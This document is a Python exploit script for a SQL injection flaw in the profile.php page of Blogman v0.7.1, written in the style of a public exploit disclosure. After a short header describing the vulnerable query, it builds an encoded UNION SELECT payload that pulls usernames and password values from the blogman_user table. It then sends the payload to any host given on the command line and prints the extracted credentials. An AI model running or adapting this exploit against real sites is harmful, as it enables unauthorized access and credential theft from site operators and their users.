#!/usr/bin/python
#
# Exploit Title:   Blogman v0.7.1 (profile.php) SQL Injection Exploit
# Date         :   28 August 2010
# Author       :   Ptrace Security (Gianni Gnesa [gnix])
# Contact      :   research[at]ptrace-security[dot]com
# Software Link:   http://sourceforge.net/projects/blogman/
# Version      :   0.7.1
# Tested on    :   EasyPHP 5.3.1.0 for Windows
#
#
# Description
# ===========
#
# + profile.php => SQL Injection!!
#
# 6:    $query = "SELECT * FROM ".$GLOBALS['dbTablePrefix']."user WHERE
#       UserID='".$_GET['id']."'";
# 7:    $profileuser = mysql_fetch_array(mysql_query($query));
#
# + profile.php => The query showed above returns a 16-columns table. UserName,
#   which is the 2nd column's name, is used few line after the query to display
#   the information extracted.
#
# 12:   echo $profileuser['UserName']."</p>\n";
#

import re
import sys
import http.client
import urllib.parse


def usage(prog):
    print('Usage  : ' + prog + ' <target> <path> <user_id>\n')
    print('Example: ' + prog + ' localhost /blogman/ 2')
    print('         ' + prog + ' www.example.com /complete/path/ 1')
    return


def exploit(target, path, userid):
    payload  = 'profile.php?id=-1%27%20UNION%20SELECT%20NULL,%20CONCAT(%27%3C1'
    payload += '%3E%27,UserName,%27:%27,UserPassword,%27%3C2%3E%27),%20NULL,%20'
    payload += 'NULL,%20NULL,%20NULL,%20NULL,%20NULL,%20NULL,%20NULL,%20NULL,'
    payload += '%20NULL,%20NULL,%20NULL,%20NULL,%20NULL%20FROM%20blogman_user'
    payload += '%20WHERE%20UserID=%27' + str(userid) + '%27%20--%20%27'

    print('[+] Sending HTTP Request')
    con = http.client.HTTPConnection(target)
    con.request('GET', path + payload)
    res = con.getresponse()
    
    if res.status != 200:
        print('[!] HTTP GET request failed.')
        exit(1)

    print('[+] Parsing HTTP Response')
    data = res.read().decode()
    pattern = re.compile(r"<1>(.+?)<2>", re.M)
    m = pattern.search(data)

    if m:
        print('[+] Information Extracted:\n')
        print(m.group()[3:-3])
    else:
        print('[!] No information found')
        
    return


print('\n+-----------------------------------------------------------------------+')
print('| Blogman v0.7.1 (profile.php) SQL Injection Exploit by Ptrace Security |')
print('+-----------------------------------------------------------------------+\n')

if len(sys.argv) != 4:
    usage(sys.argv[0])
else:
    exploit(sys.argv[1], sys.argv[2], sys.argv[3])

exit(0)